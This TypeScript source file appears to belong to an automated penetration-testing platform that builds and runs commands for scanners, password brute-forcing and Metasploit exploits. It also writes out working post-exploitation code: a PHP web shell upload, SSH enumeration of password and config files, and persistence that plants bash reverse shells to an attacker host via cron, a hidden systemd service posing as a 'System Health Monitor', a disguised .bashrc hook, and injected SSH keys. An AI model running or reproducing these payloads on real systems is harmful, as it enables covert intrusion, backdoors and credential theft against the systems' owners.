/**
 * Tool Executor — runs security tools via child_process.spawn.
 * Resolves binaries from host-mounted paths, enforces guardrails,
 * streams output to WebSocket, and parses results.
 *
 * Also supports API-based tools (ZAP, Metasploit) via HTTP integrations.
 */

import { spawn } from 'node:child_process';
import { accessSync } from 'node:fs';
import { env } from '../config/env.js';
import { emitReconOutput, emitLogEntry } from '../websocket/emitter.js';

/** Extract hostname (without port) from a URL or hostname string. */
function extractHost(target: string): string {
  try {
    const url = new URL(target);
    return url.hostname;
  } catch {
    // Not a URL — strip any port suffix
    return target.replace(/:\d+$/, '');
  }
}

/** Extract port from a URL, defaulting to 80/443 by scheme. */
function extractPort(target: string): number | undefined {
  try {
    const url = new URL(target);
    if (url.port) return parseInt(url.port, 10);
    return url.protocol === 'https:' ? 443 : 80;
  } catch {
    return undefined;
  }
}

/** Ensure a target has an HTTP(S) scheme for web tools. */
function ensureHttpUrl(target: string): string {
  if (/^https?:\/\//.test(target)) return target;
  const port = extractPort(target);
  return (port === 443 || port === 8443) ? `https://${target}` : `http://${target}`;
}

/** Find the first wordlist that exists. */
function findWordlist(candidates: string[]): string {
  for (const w of candidates) {
    try { accessSync(w); return w; } catch { continue; }
  }
  return candidates[0]; // fallback
}

interface ToolResult {
  tool: string;
  target: string;
  output: string;
  exitCode: number;
  duration: number;
  error?: string;
  // Parsed results
  vulnerability?: string;
  severity?: string;
  findings?: any[];
  credentials?: Array<{ username: string; password: string }>;
}

interface ToolOptions {
  mode?: string;
  service?: string;
  username?: string;
  password?: string;
  wordlist?: string;
  port?: number;
  scanType?: string;
  timeout?: number;
  args?: string[];
  command?: string;
  module?: string;
  payload?: string;
  lhost?: string;
  lport?: string;
  extra?: string;
  uploadUrl?: string;
  shellContent?: string;
  filename?: string;
  method?: string;
  sshPubKey?: string;
}

// Common wordlist paths (container may have different paths than host)
const COMMON_WORDLIST = [
  '/opt/cstrike/data/wordlists/common.txt',
  '/usr/share/wordlists/dirb/common.txt',
  '/usr/share/dirb/wordlists/common.txt',
  '/usr/share/seclists/Discovery/Web-Content/common.txt',
];

// Tool command builders — tools that need hostnames get extractHost(),
// web tools get the full URL.
const TOOL_COMMANDS: Record<string, (target: string, opts: ToolOptions) => string[]> = {
  nmap: (target) => {
    const host = extractHost(target);
    const port = extractPort(target);
    const args = ['nmap', '-sV', '-sC', '-oN', '-'];
    if (port && port !== 80 && port !== 443) {
      // Scan specific port + common ports
      args.push('-p', `${port},21,22,23,25,53,80,443,3306,8080,8443`);
    } else {
      args.push('--top-ports', '1000');
    }
    args.push(host);
    return args;
  },
  subfinder: (target) => ['subfinder', '-d', extractHost(target), '-silent'],
  amass: (target) => ['amass', 'enum', '-d', extractHost(target), '-passive'],
  nikto: (target) => ['nikto', '-h', ensureHttpUrl(target), '-Format', 'txt'],
  httpx: (target) => ['httpx', '-u', target, '-silent', '-status-code', '-title', '-tech-detect'],
  waybackurls: (target) => ['waybackurls', extractHost(target)],
  gau: (target) => ['gau', extractHost(target)],
  dnsenum: (target) => ['dnsenum', extractHost(target)],
  nuclei: (target) => ['nuclei', '-u', ensureHttpUrl(target), '-severity', 'critical,high,medium,low'],
  ffuf: (target) => {
    const base = ensureHttpUrl(target).replace(/\/+$/, '');
    const wl = findWordlist(COMMON_WORDLIST);
    return ['ffuf', '-u', `${base}/FUZZ`, '-w', wl, '-mc', '200,301,302,403', '-t', '10'];
  },
  gobuster: (target) => {
    const wl = findWordlist(COMMON_WORDLIST);
    return ['gobuster', 'dir', '-u', ensureHttpUrl(target), '-w', wl, '-q', '-t', '10'];
  },
  dirb: (target) => ['dirb', ensureHttpUrl(target), '-S'],
  wfuzz: (target) => {
    const url = ensureHttpUrl(target);
    const wl = findWordlist(COMMON_WORDLIST);
    return ['wfuzz', '-c', '-z', `file,${wl}`, '--hc', '404', `${url}/FUZZ`];
  },
  sqlmap: (target) => {
    const url = ensureHttpUrl(target).replace(/\/+$/, '');
    return ['sqlmap', '-u', `${url}/login.php`, '--batch', '--level=1', '--risk=1', '--forms', '--smart'];
  },
  xsstrike: (target) => ['xsstrike', '-u', ensureHttpUrl(target), '--blind'],
  whatweb: (target) => ['whatweb', ensureHttpUrl(target), '-a', '3'],
  wafw00f: (target) => ['wafw00f', ensureHttpUrl(target)],
  sslscan: (target) => ['sslscan', extractHost(target)],
  sslyze: (target) => ['sslyze', extractHost(target)],
  testssl: (target) => ['testssl.sh', target],
  masscan: (target) => [
    'masscan', extractHost(target), '-p1-65535', '--rate=1000', '--open-only',
  ],
  rustscan: (target) => ['rustscan', '-a', extractHost(target), '--ulimit', '5000'],
  feroxbuster: (target) => {
    const wl = findWordlist(COMMON_WORDLIST);
    return ['feroxbuster', '-u', target, '-w', wl, '-q'];
  },
  katana: (target) => ['katana', '-u', target, '-d', '3', '-silent'],
  hydra: (target, opts) => {
    const host = extractHost(target);
    const args = ['hydra'];
    if (opts.username) args.push('-l', opts.username);
    else args.push('-L', findWordlist([
      '/opt/cstrike/data/wordlists/usernames.txt',
      '/opt/wordlists/usernames.txt',
      '/usr/share/wordlists/metasploit/unix_users.txt',
      '/usr/share/wordlists/nmap.lst',
    ]));

    const wordlistMap: Record<string, string> = {
      'rockyou.txt': findWordlist(['/opt/cstrike/data/wordlists/passwords.txt', '/opt/wordlists/passwords.txt', '/usr/share/wordlists/rockyou.txt']),
      rockyou: findWordlist(['/opt/cstrike/data/wordlists/passwords.txt', '/opt/wordlists/passwords.txt', '/usr/share/wordlists/rockyou.txt']),
      fasttrack: findWordlist(['/opt/cstrike/data/wordlists/passwords.txt', '/opt/wordlists/passwords.txt', '/usr/share/wordlists/fasttrack.txt']),
    };
    args.push('-P', wordlistMap[opts.wordlist ?? 'fasttrack'] ?? opts.wordlist ?? findWordlist(['/opt/cstrike/data/wordlists/passwords.txt']));

    if (opts.port) args.push('-s', String(opts.port));
    args.push('-t', '8');
    // Traditional positional format: hydra [opts] host service
    args.push(host || 'localhost');
    args.push((opts.service ?? 'ssh').toLowerCase());
    return args;
  },
  john: (target) => {
    const wl = findWordlist([
      '/opt/cstrike/data/wordlists/passwords-10k.txt',
      '/opt/cstrike/data/wordlists/passwords.txt',
      '/usr/share/wordlists/rockyou.txt',
    ]);
    return ['john', `--wordlist=${wl}`, target];
  },
  hashcat: (target) => {
    const wl = findWordlist([
      '/opt/cstrike/data/wordlists/passwords-10k.txt',
      '/opt/cstrike/data/wordlists/passwords.txt',
      '/usr/share/wordlists/rockyou.txt',
    ]);
    return ['hashcat', '-m', '0', target, wl, '--force'];
  },
  enum4linux: (target) => ['enum4linux-ng', '-A', extractHost(target)],
  smbclient: (target) => ['smbclient', '-L', extractHost(target), '-N'],
  nbtscan: (target) => ['nbtscan', extractHost(target)],
  snmpwalk: (target) => ['snmpwalk', '-v2c', '-c', 'public', extractHost(target)],
  dnsrecon: (target) => ['dnsrecon', '-d', extractHost(target)],
  commix: (target) => ['commix', '--url', target, '--batch'],
  traceroute: (target) => {
    const host = extractHost(target);
    // Use mtr in report mode for structured output with AS numbers and geo hints
    // Falls back to traceroute if mtr unavailable
    return ['mtr', '--report', '--report-cycles', '1', '--no-dns', '--json', host];
  },
  searchsploit: (target, opts) => {
    // Search ExploitDB for known exploits — use query if provided, else target host
    const query = opts.args?.[0] || extractHost(target);
    return ['searchsploit', '-j', query];
  },
  metasploit: (target) => {
    const host = extractHost(target);
    const port = extractPort(target);
    // Build comprehensive auxiliary scan commands
    const modules: string[] = [
      // Service version detection
      `use auxiliary/scanner/smb/smb_version; set RHOSTS ${host}; set THREADS 5; run`,
      `use auxiliary/scanner/ssh/ssh_version; set RHOSTS ${host}; run`,
      `use auxiliary/scanner/ftp/ftp_version; set RHOSTS ${host}; run`,
      `use auxiliary/scanner/http/http_version; set RHOSTS ${host}; set RPORT ${port || 80}; run`,
      // Vulnerability scanning
      `use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS ${host}; run`,
      `use auxiliary/scanner/ssl/openssl_heartbleed; set RHOSTS ${host}; set RPORT ${port || 443}; run`,
      // Enumeration
      `use auxiliary/scanner/smb/smb_enumshares; set RHOSTS ${host}; run`,
      `use auxiliary/scanner/smb/smb_enumusers; set RHOSTS ${host}; run`,
      // MySQL
      `use auxiliary/scanner/mysql/mysql_version; set RHOSTS ${host}; run`,
      // HTTP
      `use auxiliary/scanner/http/http_header; set RHOSTS ${host}; set RPORT ${port || 80}; run`,
    ];
    const fullCommand = modules.join('; ') + '; exit';
    // Execute inside the MSF container via docker exec
    return ['docker', 'exec', 'cstrike-msf', 'msfconsole', '-q', '-n', '-x', fullCommand];
  },

  // ── Post-exploitation tools ──────────────────────────────────────────────

  ssh_connect: (target, opts) => {
    const host = extractHost(target);
    const port = opts.port ?? 22;
    const user = opts.username ?? 'root';
    const password = opts.password ?? '';
    const cmd = opts.command ?? 'id; whoami; hostname; uname -a; sudo -l 2>&1; cat /etc/passwd | grep -v nologin; find / -perm -4000 -type f 2>/dev/null; ls -la /etc/cron.d/ 2>/dev/null; cat /etc/crontab 2>/dev/null';
    return ['sshpass', '-p', password, 'ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'UserKnownHostsFile=/dev/null', '-o', 'ConnectTimeout=10', '-p', String(port), `${user}@${host}`, cmd];
  },

  msf_exploit: (target, opts) => {
    const host = extractHost(target);
    const module = opts.module ?? 'exploit/multi/handler';
    const payload = opts.payload ?? 'linux/aarch64/shell_reverse_tcp';
    const lhost = opts.lhost ?? '10.10.10.1';
    const lport = opts.lport ?? '4444';
    const extra = opts.extra ?? '';
    const msfCmd = `use ${module}; set RHOSTS ${host}; set RHOST ${host}; set PAYLOAD ${payload}; set LHOST ${lhost}; set LPORT ${lport}; ${extra}; run; sleep 10; exit`;
    return ['docker', 'exec', 'cstrike-msf', 'msfconsole', '-q', '-x', msfCmd];
  },

  privesc_check: (target, opts) => {
    const host = extractHost(target);
    const port = opts.port ?? 22;
    const user = opts.username ?? 'admin';
    const password = opts.password ?? '';
    const enumCmd = [
      'echo "=== SUID ===" && find / -perm -4000 -type f 2>/dev/null',
      'echo "=== SUDO ===" && sudo -l 2>&1',
      'echo "=== CRON ===" && cat /etc/crontab 2>/dev/null && ls -la /etc/cron.d/ 2>/dev/null',
      'echo "=== WRITABLE ===" && find / -writable -type d 2>/dev/null | head -20',
      'echo "=== KERNEL ===" && uname -r && cat /proc/version 2>/dev/null',
      'echo "=== PASSWD ===" && cat /etc/passwd | grep -v nologin | grep -v false',
      'echo "=== HOME ===" && ls -laR /home/ 2>/dev/null | head -50',
      'echo "=== ENV ===" && find / -name ".env" -o -name "*.conf" -o -name "config.php*" 2>/dev/null | head -20',
    ].join(' && ');
    return ['sshpass', '-p', password, 'ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'UserKnownHostsFile=/dev/null', '-o', 'ConnectTimeout=10', '-p', String(port), `${user}@${host}`, enumCmd];
  },

  webshell_upload: (target, opts) => {
    const uploadUrl = opts.uploadUrl ?? `${target}/upload.php`;
    const shellContent = opts.shellContent ?? '<?php system($_GET["cmd"]); ?>';
    const filename = opts.filename ?? 'shell.php';
    return ['sh', '-c', `echo '${shellContent}' > /tmp/${filename} && curl -s -F "file=@/tmp/${filename}" "${uploadUrl}" && echo "UPLOAD_COMPLETE" && curl -s "${target}/uploads/${filename}?cmd=id" && rm -f /tmp/${filename}`];
  },

  // ── Persistence payloads ──────────────────────────────────────────────

  deploy_persistence: (target, opts) => {
    const host = extractHost(target);
    const port = opts.port ?? 22;
    const user = opts.username ?? 'root';
    const password = opts.password ?? '';
    const method = opts.method ?? 'all';
    const lhost = opts.lhost ?? '10.10.10.1';
    const lport = opts.lport ?? '4444';
    const sshPubKey = opts.sshPubKey ?? '';
    const sshOpts = ['-o', 'StrictHostKeyChecking=no', '-o', 'UserKnownHostsFile=/dev/null', '-o', 'ConnectTimeout=10', '-p', String(port)];

    const commands: string[] = [];

    // Cron reverse shell — beacon every 5 minutes
    if (method === 'cron' || method === 'all') {
      commands.push(
        `echo "=== CRON PERSISTENCE ===" && (crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1' 2>/dev/null") | sort -u | crontab - && echo "CRON_INSTALLED"`,
      );
    }

    // SSH authorized_keys injection
    if (method === 'ssh_key' || method === 'all') {
      const key = sshPubKey || 'ssh-ed25519 AAAA_PLACEHOLDER_KEY cstrike@persistence';
      commands.push(
        `echo "=== SSH KEY PERSISTENCE ===" && mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo "${key}" >> ~/.ssh/authorized_keys && sort -u -o ~/.ssh/authorized_keys ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && echo "SSH_KEY_INSTALLED"`,
      );
    }

    // Systemd hidden service — disguised as a health check
    if (method === 'systemd' || method === 'all') {
      const unitContent = `[Unit]\\nDescription=System Health Monitor\\nAfter=network.target\\n\\n[Service]\\nType=simple\\nExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/${lhost}/${lport} 0>&1 2>/dev/null; sleep 300; done'\\nRestart=always\\nRestartSec=60\\n\\n[Install]\\nWantedBy=multi-user.target`;
      commands.push(
        `echo "=== SYSTEMD PERSISTENCE ===" && printf '${unitContent}' > /etc/systemd/system/.health-monitor.service && systemctl daemon-reload && systemctl enable .health-monitor.service 2>/dev/null && systemctl start .health-monitor.service 2>/dev/null && echo "SYSTEMD_INSTALLED"`,
      );
    }

    // Bashrc hook — triggers on interactive login
    if (method === 'bashrc' || method === 'all') {
      commands.push(
        `echo "=== BASHRC PERSISTENCE ===" && for f in /root/.bashrc /home/*/.bashrc; do [ -f "$f" ] && grep -q "health-check" "$f" || echo '(bash -i >& /dev/tcp/${lhost}/${lport} 0>&1 &) 2>/dev/null # health-check' >> "$f" && echo "BASHRC_HOOK: $f"; done && echo "BASHRC_INSTALLED"`,
      );
    }

    const fullCmd = commands.join(' && ');
    return ['sshpass', '-p', password, 'ssh', ...sshOpts, `${user}@${host}`, fullCmd];
  },

  verify_persistence: (target, opts) => {
    const host = extractHost(target);
    const port = opts.port ?? 22;
    const user = opts.username ?? 'root';
    const password = opts.password ?? '';
    const sshOpts = ['-o', 'StrictHostKeyChecking=no', '-o', 'UserKnownHostsFile=/dev/null', '-o', 'ConnectTimeout=10', '-p', String(port)];

    const enumCmd = [
      'echo "=== CRON CHECK ===" && crontab -l 2>/dev/null | grep -c "dev/tcp" && echo "CRON_ACTIVE" || echo "CRON_MISSING"',
      'echo "=== SSH KEY CHECK ===" && cat ~/.ssh/authorized_keys 2>/dev/null | wc -l && echo "SSH_KEYS_PRESENT" || echo "SSH_KEY_MISSING"',
      'echo "=== SYSTEMD CHECK ===" && systemctl is-active .health-monitor.service 2>/dev/null && echo "SYSTEMD_ACTIVE" || echo "SYSTEMD_MISSING"',
      'echo "=== BASHRC CHECK ===" && grep -rl "health-check" /root/.bashrc /home/*/.bashrc 2>/dev/null && echo "BASHRC_ACTIVE" || echo "BASHRC_MISSING"',
      'echo "=== ACTIVE CONNECTIONS ===" && ss -tnp 2>/dev/null | grep ESTAB | head -10',
      'echo "=== PERSISTENCE SUMMARY ===" && echo "Verification complete"',
    ].join(' && ');

    return ['sshpass', '-p', password, 'ssh', ...sshOpts, `${user}@${host}`, enumCmd];
  },
};

class ToolExecutor {
  /**
   * Resolve a binary to its full path, checking host-mounted locations first.
   */
  private resolveBinary(name: string): string {
    const searchPaths = [
      // Check container-local paths first (tools installed in container)
      '/usr/local/bin',
      '/usr/bin',
      // Then check host-mounted paths
      env.HOST_LOCAL_BIN_PATH,
      env.HOST_BIN_PATH,
      env.HOST_SBIN_PATH,
      `${env.HOST_OPT_PATH}/metasploit-framework/bin`,
    ];

    for (const dir of searchPaths) {
      const full = `${dir}/${name}`;
      try {
        accessSync(full);
        return full;
      } catch {
        continue;
      }
    }

    // Fall back to bare name (relies on PATH)
    return name;
  }

  // Tool-specific timeout overrides (ms)
  private static readonly TOOL_TIMEOUTS: Record<string, number> = {
    metasploit: 600_000,   // 10 min — MSF loads slowly + multiple modules
    msf_exploit: 600_000,  // 10 min — MSF exploit execution
    zap: 600_000,          // 10 min — spider + active scan
    traceroute: 60_000,   // 1 min
    searchsploit: 60_000,  // 1 min
    ssh_connect: 60_000,   // 1 min — single SSH command
    privesc_check: 120_000, // 2 min — enumeration over SSH
    webshell_upload: 60_000, // 1 min
    deploy_persistence: 120_000, // 2 min — deploys multiple mechanisms
    verify_persistence: 60_000,  // 1 min — verification check
  };

  /**
   * Run a tool against a target.
   */
  async run(tool: string, target: string, opts: ToolOptions = {}): Promise<ToolResult> {
    // API-based tools dispatch to dedicated handlers
    if (tool === 'zap') return this.runZapScan(target, opts);

    const commandBuilder = TOOL_COMMANDS[tool];
    if (!commandBuilder) {
      return {
        tool,
        target,
        output: '',
        exitCode: 1,
        duration: 0,
        error: `Unknown tool: ${tool}`,
      };
    }

    const args = commandBuilder(target, opts);
    const binary = this.resolveBinary(args[0]);
    const spawnArgs = args.slice(1);
    const timeout = opts.timeout ?? ToolExecutor.TOOL_TIMEOUTS[tool] ?? 300_000;

    console.log(`[ToolExec] ${tool}: ${binary} ${spawnArgs.join(' ')}`);

    const startTime = Date.now();
    let output = '';

    emitLogEntry({
      level: 'INFO',
      source: tool,
      message: `Starting ${tool} against ${target}`,
    });

    return new Promise((resolve) => {
      const child = spawn(binary, spawnArgs, {
        timeout,
        env: {
          ...process.env,
          PATH: `/usr/local/bin:/usr/bin:${env.HOST_LOCAL_BIN_PATH}:${env.HOST_BIN_PATH}:${env.HOST_SBIN_PATH}:${process.env.PATH}`,
        },
      });

      child.stdout?.on('data', (data) => {
        const chunk = data.toString();
        output += chunk;

        // Stream to WebSocket
        emitReconOutput({
          tool,
          target,
          output: chunk,
          complete: false,
        });
      });

      child.stderr?.on('data', (data) => {
        output += data.toString();
      });

      child.on('close', (code) => {
        const duration = Date.now() - startTime;

        emitReconOutput({
          tool,
          target,
          output: `[${tool}] Complete (${Math.round(duration / 1000)}s)`,
          complete: true,
        });

        resolve({
          tool,
          target,
          output,
          exitCode: code ?? 1,
          duration,
          error: code !== 0 ? `Exit code ${code}` : undefined,
        });
      });

      child.on('error', (err) => {
        resolve({
          tool,
          target,
          output,
          exitCode: 1,
          duration: Date.now() - startTime,
          error: err.message,
        });
      });
    });
  }

  // ── ZAP REST API integration ────────────────────────────────────────────

  /**
   * Run OWASP ZAP scan via REST API.
   * Flow: spider target → active scan → retrieve alerts.
   */
  private async runZapScan(target: string, opts: ToolOptions): Promise<ToolResult> {
    const startTime = Date.now();
    const zapBase = `http://${env.ZAP_HOST}:${env.ZAP_PORT}`;
    const targetUrl = ensureHttpUrl(target);

    emitLogEntry({
      level: 'INFO',
      source: 'zap',
      message: `Starting ZAP scan against ${targetUrl}`,
    });

    emitReconOutput({
      tool: 'zap',
      target,
      output: `[ZAP] Connecting to ZAP daemon at ${zapBase}...\n`,
      complete: false,
    });

    try {
      // Verify ZAP is running
      const versionResp = await fetch(`${zapBase}/JSON/core/view/version/`);
      if (!versionResp.ok) throw new Error(`ZAP daemon not responding (HTTP ${versionResp.status})`);
      const versionData = await versionResp.json() as { version: string };

      emitReconOutput({
        tool: 'zap',
        target,
        output: `[ZAP] Connected — ZAP version ${versionData.version}\n`,
        complete: false,
      });

      // ── Step 1: Spider ──────────────────────────────────────────
      emitReconOutput({
        tool: 'zap',
        target,
        output: `[ZAP] Spidering ${targetUrl}...\n`,
        complete: false,
      });

      const spiderResp = await fetch(
        `${zapBase}/JSON/spider/action/scan/?url=${encodeURIComponent(targetUrl)}&maxChildren=20&recurse=true`,
      );
      const spiderData = await spiderResp.json() as { scan: string };
      const spiderId = spiderData.scan;

      // Wait for spider to complete (max 2 minutes)
      const spiderTimeout = Date.now() + 120_000;
      let spiderProgress = 0;
      while (spiderProgress < 100 && Date.now() < spiderTimeout) {
        await new Promise((r) => setTimeout(r, 3000));
        const statusResp = await fetch(`${zapBase}/JSON/spider/view/status/?scanId=${spiderId}`);
        const statusData = await statusResp.json() as { status: string };
        spiderProgress = parseInt(statusData.status, 10) || 0;

        emitReconOutput({
          tool: 'zap',
          target,
          output: `[ZAP] Spider progress: ${spiderProgress}%\n`,
          complete: false,
        });
      }

      // Get spider results
      const spiderResultsResp = await fetch(`${zapBase}/JSON/spider/view/results/?scanId=${spiderId}`);
      const spiderResults = await spiderResultsResp.json() as { results: string[] };
      const discoveredUrls = spiderResults.results || [];

      emitReconOutput({
        tool: 'zap',
        target,
        output: `[ZAP] Spider complete — ${discoveredUrls.length} URLs discovered\n`,
        complete: false,
      });

      // ── Step 2: Active Scan ─────────────────────────────────────
      emitReconOutput({
        tool: 'zap',
        target,
        output: `[ZAP] Starting active scan...\n`,
        complete: false,
      });

      const ascanResp = await fetch(
        `${zapBase}/JSON/ascan/action/scan/?url=${encodeURIComponent(targetUrl)}&recurse=true&scanPolicyName=`,
      );
      const ascanData = await ascanResp.json() as { scan: string };
      const ascanId = ascanData.scan;

      // Wait for active scan (max 8 minutes)
      const scanTimeout = Date.now() + 480_000;
      let scanProgress = 0;
      while (scanProgress < 100 && Date.now() < scanTimeout) {
        await new Promise((r) => setTimeout(r, 5000));
        const statusResp = await fetch(`${zapBase}/JSON/ascan/view/status/?scanId=${ascanId}`);
        const statusData = await statusResp.json() as { status: string };
        scanProgress = parseInt(statusData.status, 10) || 0;

        emitReconOutput({
          tool: 'zap',
          target,
          output: `[ZAP] Active scan progress: ${scanProgress}%\n`,
          complete: false,
        });
      }

      // ── Step 3: Retrieve alerts ─────────────────────────────────
      const alertsResp = await fetch(
        `${zapBase}/JSON/core/view/alerts/?baseurl=${encodeURIComponent(targetUrl)}&start=0&count=200`,
      );
      const alertsData = await alertsResp.json() as {
        alerts: Array<{
          risk: string;
          confidence: string;
          alert: string;
          url: string;
          description: string;
          solution: string;
          param: string;
          attack: string;
          evidence: string;
          cweid: string;
        }>;
      };
      const alerts = alertsData.alerts || [];

      // Format output
      const lines: string[] = [
        `OWASP ZAP Scan Report — ${targetUrl}`,
        `Spider: ${discoveredUrls.length} URLs discovered`,
        `Alerts: ${alerts.length} findings`,
        '',
      ];

      // Group by risk level
      const byRisk: Record<string, typeof alerts> = {};
      for (const alert of alerts) {
        const risk = alert.risk || 'Informational';
        if (!byRisk[risk]) byRisk[risk] = [];
        byRisk[risk].push(alert);
      }

      for (const risk of ['High', 'Medium', 'Low', 'Informational']) {
        const group = byRisk[risk];
        if (!group?.length) continue;
        lines.push(`\n═══ ${risk.toUpperCase()} RISK (${group.length}) ═══`);
        for (const a of group) {
          lines.push(`  [${a.risk}/${a.confidence}] ${a.alert}`);
          lines.push(`    URL: ${a.url}`);
          if (a.param) lines.push(`    Param: ${a.param}`);
          if (a.attack) lines.push(`    Attack: ${a.attack}`);
          if (a.evidence) lines.push(`    Evidence: ${a.evidence.slice(0, 200)}`);
          if (a.cweid && a.cweid !== '-1') lines.push(`    CWE: ${a.cweid}`);
          lines.push(`    Solution: ${a.solution.slice(0, 200)}`);
          lines.push('');
        }
      }

      // Include discovered URLs
      if (discoveredUrls.length > 0) {
        lines.push(`\n═══ DISCOVERED URLs (${discoveredUrls.length}) ═══`);
        for (const url of discoveredUrls.slice(0, 50)) {
          lines.push(`  ${url}`);
        }
        if (discoveredUrls.length > 50) {
          lines.push(`  ... and ${discoveredUrls.length - 50} more`);
        }
      }

      const output = lines.join('\n');

      emitReconOutput({
        tool: 'zap',
        target,
        output: `[ZAP] Complete — ${alerts.length} alerts found\n`,
        complete: true,
      });

      return {
        tool: 'zap',
        target,
        output,
        exitCode: 0,
        duration: Date.now() - startTime,
        findings: alerts.map((a) => ({
          type: a.risk === 'High' || a.risk === 'Medium' ? 'vulnerability' : 'info',
          title: a.alert,
          detail: `${a.url} — ${a.description.slice(0, 200)}`,
        })),
      };
    } catch (err: any) {
      const errorMsg = err.message || 'Unknown error';

      emitReconOutput({
        tool: 'zap',
        target,
        output: `[ZAP] Error: ${errorMsg}\n`,
        complete: true,
      });

      emitLogEntry({
        level: 'ERROR',
        source: 'zap',
        message: `ZAP scan failed: ${errorMsg}. Is the ZAP container running? (docker compose up zap)`,
      });

      return {
        tool: 'zap',
        target,
        output: `ZAP scan failed: ${errorMsg}\nEnsure the ZAP container is running: docker compose up -d zap`,
        exitCode: 1,
        duration: Date.now() - startTime,
        error: errorMsg,
      };
    }
  }
}

export const toolExecutor = new ToolExecutor();
